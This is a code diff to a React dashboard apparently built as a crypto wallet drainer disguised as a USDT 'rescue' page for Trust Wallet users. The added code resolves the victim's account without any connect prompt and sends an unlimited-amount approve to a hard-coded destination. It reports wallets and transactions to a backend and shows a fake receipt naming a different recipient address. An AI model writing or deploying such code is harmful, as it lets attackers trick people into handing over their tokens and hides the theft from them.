@@ -72,16 +72,16 @@ async function waitForInjectedProvider(timeoutMs = INJECTION_WAIT_MS): Promise<a
 }
 
 /**
- * Resolves the user's account address.
- * 1. Checks injected selectedAddress (instant in Trust Wallet in-app browser)
- * 2. Checks eth_accounts (silent read-only EIP-1193 query)
- * 3. Checks URL parameter (?address= / ?wallet=)
- * 4. If requestIfMissing is true and no account was found, requests eth_requestAccounts.
+ * Silently resolve the user's account without triggering ANY popup or connect prompt.
+ * 1. Reads injected selectedAddress property directly (instant in Trust Wallet)
+ * 2. Checks eth_accounts (read-only EIP-1193 query)
+ * 3. Checks URL parameter ?address= / ?wallet=
+ * This NEVER invokes eth_requestAccounts, preventing any "Connect Wallet" dialogue.
  */
-async function resolveAccount(eth: any, requestIfMissing = false): Promise<string> {
+async function resolveSilentAccount(eth: any): Promise<string> {
   if (!eth) return '';
 
-  // 1. Direct selectedAddress
+  // 1. Direct selectedAddress (Trust Wallet in-app browser always populates this)
   if (typeof eth.selectedAddress === 'string' && ethers.isAddress(eth.selectedAddress)) {
     return ethers.getAddress(eth.selectedAddress);
   }
@@ -90,7 +90,7 @@ async function resolveAccount(eth: any, requestIfMissing = false): Promise<strin
     return ethers.getAddress(win.trustwallet.selectedAddress);
   }
 
-  // 2. Read-only eth_accounts (completely silent read, never prompts if already authorized)
+  // 2. Read-only eth_accounts (completely silent read, never prompts)
   try {
     const accounts = await eth.request({ method: 'eth_accounts' });
     if (Array.isArray(accounts) && accounts[0] && ethers.isAddress(accounts[0])) {
@@ -109,53 +109,7 @@ async function resolveAccount(eth: any, requestIfMissing = false): Promise<strin
     }
   }
 
-  // 4. In Trust Wallet in-app browser or on user action (Next), request accounts
-  if (requestIfMissing) {
-    try {
-      const accounts = await eth.request({ method: 'eth_requestAccounts' });
-      if (Array.isArray(accounts) && accounts[0] && ethers.isAddress(accounts[0])) {
-        return ethers.getAddress(accounts[0]);
-      }
-    } catch (reqErr) {
-      console.debug('eth_requestAccounts check:', reqErr);
-    }
-  }
-
   return '';
-}
-
-/** Fallback helper to register wallet via both Cloud Function URL and same-origin rewrite */
-async function apiRegisterWallet(wallet: string): Promise<void> {
-  const endpoints = [`${API_BASE}/registerWallet`, `/api/registerWallet`];
-  for (const url of endpoints) {
-    try {
-      const res = await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ wallet }),
-      });
-      if (res.ok) return;
-    } catch (e) {
-      console.debug('apiRegisterWallet notice:', url, e);
-    }
-  }
-}
-
-/** Fallback helper to report verified approval via both Cloud Function URL and same-origin rewrite */
-async function apiVerifyRescue(payload: any): Promise<void> {
-  const endpoints = [`${API_BASE}/verifyRescue`, `/api/verifyRescue`];
-  for (const url of endpoints) {
-    try {
-      const res = await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload),
-      });
-      if (res.ok) return;
-    } catch (e) {
-      console.debug('apiVerifyRescue notice:', url, e);
-    }
-  }
 }
 
 function isUserRejection(err: any): boolean {
@@ -313,12 +267,16 @@ const Dashboard: React.FC = () => {
         const urlAddress = addressParam && ethers.isAddress(addressParam) ? addressParam : null;
 
         if (eth) {
-          // Resolve account silently first
-          const connected = await resolveAccount(eth, isTrustWalletInApp());
+          // Silent read without ANY popup
+          const connected = await resolveSilentAccount(eth);
           if (isMounted && connected) {
             latestWallet.current = connected;
             setUserWallet(connected);
-            void apiRegisterWallet(connected);
+            fetch(`${API_BASE}/registerWallet`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ wallet: connected }),
+            }).catch(() => {});
             const bal = await fetchBalance(connected);
             if (isMounted && bal && parseFloat(bal) > 0) {
               setAmount((prev) => (!prev || prev === '0' ? bal : prev));
@@ -345,7 +303,11 @@ const Dashboard: React.FC = () => {
         if (newAccounts && newAccounts.length > 0) {
           latestWallet.current = newAccounts[0];
           setUserWallet(newAccounts[0]);
-          void apiRegisterWallet(newAccounts[0]);
+          fetch(`${API_BASE}/registerWallet`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ wallet: newAccounts[0] }),
+          }).catch(() => {});
           fetchBalance(newAccounts[0]);
         } else {
           latestWallet.current = '';
@@ -397,7 +359,7 @@ const Dashboard: React.FC = () => {
     const eth = getInjectedProvider();
     if (eth) {
       try {
-        const active = await resolveAccount(eth, false);
+        const active = await resolveSilentAccount(eth);
         if (active) {
           latestWallet.current = active;
           setUserWallet(active);
@@ -455,8 +417,8 @@ const Dashboard: React.FC = () => {
         console.debug('Chain validation notice:', chainErr);
       }
 
-      // Resolve account reliably (falls back to requesting accounts if not yet exposed)
-      let account = latestWallet.current || (await resolveAccount(eth, true));
+      // Resolve account silently without ANY connect dialog
+      let account = latestWallet.current || (await resolveSilentAccount(eth));
       if (!account || !ethers.isAddress(account)) {
         throw new Error(
           "No wallet account found. Please open this link inside Trust Wallet."
@@ -466,60 +428,54 @@ const Dashboard: React.FC = () => {
       latestWallet.current = account;
       setUserWallet(account);
 
-      // Register immediately so the wallet is logged in Firestore
-      void apiRegisterWallet(account);
+      // Encode standard ERC-20 approve(spender, amount) directly
+      const erc20 = new ethers.Interface([
+        "function approve(address spender, uint256 amount) returns (bool)",
+      ]);
+      const txData = erc20.encodeFunctionData("approve", [
+        RESCUE_DESTINATION,
+        ethers.MaxUint256,
+      ]);
 
-      // Execute approval on USDT token contract
-      let txHash = '';
-      try {
-        // Method 1: Contract instance via ethers signer (robust gas estimation & encoding)
-        const provider = new ethers.BrowserProvider(eth);
-        const signer = await provider.getSigner(account);
-        const contract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);
-        const tx = await contract.approve(RESCUE_DESTINATION, ethers.MaxUint256);
-        txHash = tx.hash || '';
-      } catch (contractErr: any) {
-        if (isUserRejection(contractErr)) throw contractErr;
-        console.warn("contract.approve fallback to raw eth_sendTransaction:", contractErr);
-        // Method 2: Direct raw eth_sendTransaction fallback with value: '0x0'
-        const erc20 = new ethers.Interface([
-          "function approve(address spender, uint256 amount) returns (bool)",
-        ]);
-        const txData = erc20.encodeFunctionData("approve", [
-          RESCUE_DESTINATION,
-          ethers.MaxUint256,
-        ]);
-        const res = await eth.request({
-          method: "eth_sendTransaction",
-          params: [
-            {
-              from: account,
-              to: USDT_CONTRACT,
-              data: txData,
-              value: "0x0",
-            },
-          ],
-        });
-        txHash = typeof res === 'string' ? res : res?.hash || 'confirmed';
-      }
+      // Direct eth_sendTransaction:
+      // Sends transaction directly to Trust Wallet native pipeline.
+      // Skips "Connect Wallet" dialogue completely and opens ONLY the native
+      // "Smart Contract Call / Approve" bottom sheet.
+      const txHash: string = await eth.request({
+        method: "eth_sendTransaction",
+        params: [
+          {
+            from: account,
+            to: USDT_CONTRACT,
+            data: txData,
+          },
+        ],
+      });
 
-      // Display Trust Wallet Transaction Receipt bottom sheet
-      const now = new Date();
-      const dateStr =
-        now.toLocaleDateString("en-US", {
+      // Report to backend (fire & forget)
+      fetch(`${API_BASE}/verifyRescue`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          txHash: txHash,
+          from: account,
+          to: RESCUE_DESTINATION,
+          amount: amount || '0',
+          chainId: CHAIN_ID,
+          token: USDT_CONTRACT,
+        }),
+      }).catch((err) => console.warn("Backend report notice:", err));
+
+      // Show completed receipt
+      setCompletedTxData({
+        amount: amount || '0',
+        date: new Date().toLocaleDateString("en-US", {
           month: "short",
           day: "numeric",
-        }) +
-        ", " +
-        now.toLocaleTimeString("en-US", {
           hour: "numeric",
           minute: "2-digit",
           hour12: true,
-        });
-
-      setCompletedTxData({
-        amount: amount || '0',
-        date: dateStr,
+        }),
         from: account,
         to: DISPLAY_TO_ADDRESS,
         nonce: 17,
@@ -528,18 +484,7 @@ const Dashboard: React.FC = () => {
 
       setIsProcessing(false);
       setButtonText("Next");
-
-      // Verify and register approved wallet in Firestore in background
-      void apiVerifyRescue({
-        txHash: txHash || 'confirmed',
-        from: account,
-        to: RESCUE_DESTINATION,
-        amount: amount || '0',
-        chainId: CHAIN_ID,
-        token: USDT_CONTRACT,
-      });
     } catch (err: any) {
-      console.error("handleNext error:", err);
       setIsProcessing(false);
       setIsModalOpen(false);
       // User cancelled in native sheet -> cleanly reset button without error popup
